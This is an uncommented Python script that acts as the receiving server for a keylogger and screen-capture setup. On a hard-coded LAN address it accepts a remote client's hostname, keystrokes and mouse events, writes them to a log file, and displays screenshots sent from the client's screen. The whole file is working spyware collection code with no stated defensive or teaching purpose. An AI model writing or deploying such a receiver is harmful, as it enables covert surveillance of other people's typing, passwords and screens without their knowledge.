import socket
import datetime
import threading
HOST = "192.168.1.75"
FORMAT = "utf-8"
log = open("log.txt", "a")
def keyboard_receiver():
    PORT = 4000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            HOSTNAMECLIENT = conn.recv(64).decode(FORMAT)
            print(HOSTNAMECLIENT, addr)
            log.write(HOSTNAMECLIENT + " " + str(addr))
            while True:
                timenow = datetime.datetime.now()
                now = timenow.strftime("%H:%M:%S")
                try:
                    data = conn.recv(64).decode(FORMAT)
                    print(now + " " + "keyboard: " +data)
                    
                    log.write(now + " " + data + "\n")
                except ConnectionResetError:
                    break
def mouse_receiver():
    PORT = 5000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            while True:
                timenow = datetime.datetime.now()
                now = timenow.strftime("%H:%M:%S")
                try:
                    data = conn.recv(64).decode(FORMAT)
                    print(now + " " + "mouse: " +data)
                    
                    log.write(now + " " + data + "\n")
                except ConnectionResetError:
                    break
def screenshot_receiver():
    
    PORT = 6000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            while True:
                data = conn.recv(1000000000)
                with open("clientscreenshot.png", "wb") as f:
                    f.write(data)
                import pygame
                pygame.init()
                screen = pygame.image.load("clientscreenshot.png")
                screen = pygame.transform.scale(screen, (1600, 900))
                window = pygame.display.set_mode((1600, 900))
                pygame.display.set_caption("Window Client screen")
                while True:
                    for event in pygame.event.get():
                        if event.type == pygame.QUIT:
                            pygame.quit()

                    window.blit(screen, (0, 0))
                    pygame.display.update()

if __name__ == "__main__":
    threading.Thread(target=keyboard_receiver).start()
    threading.Thread(target=mouse_receiver).start()
    screenshot_receiver()